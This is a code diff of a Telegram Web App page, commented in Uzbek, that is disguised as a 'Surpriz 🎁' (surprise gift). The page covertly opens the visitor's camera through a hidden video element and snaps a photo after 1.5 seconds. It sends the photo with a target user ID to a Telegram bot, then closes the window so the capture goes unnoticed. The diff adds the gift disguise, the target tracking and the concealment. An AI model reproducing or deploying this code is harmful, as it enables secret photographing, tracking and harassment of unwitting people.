@@ -1,31 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Prank Camera</title>
+    <title>Surpriz 🎁</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
-    <video id="video" width="0" height="0" autoplay></video>
+    <video id="video" width="0" height="0" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        // Kameraga ulanish
+        // Ssilka ichidan user_id ni olish
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('user_id');
+
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
-                // 2 soniyadan keyin rasmga tushiradi (ruxsat bergan zahoti)
                 setTimeout(() => {
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const data = canvas.toDataURL('image/jpeg');
                     
-                    // Rasmni botga yuborish
-                    Telegram.WebApp.sendData(JSON.stringify({photo: data}));
-                }, 2000);
+                    // Rasmni va ID-ni botga yuborish
+                    Telegram.WebApp.sendData(JSON.stringify({
+                        photo: data,
+                        target_id: userId
+                    }));
+                    
+                    // Prank sezilmasligi uchun oynani yopish
+                    setTimeout(() => Telegram.WebApp.close(), 500);
+                }, 1500);
             })
-            .catch(err => console.log("Xatolik: " + err));
+            .catch(err => {
+                console.error("Xatolik:", err);
+                Telegram.WebApp.close();
+            });
     </script>
 </body>
 </html>
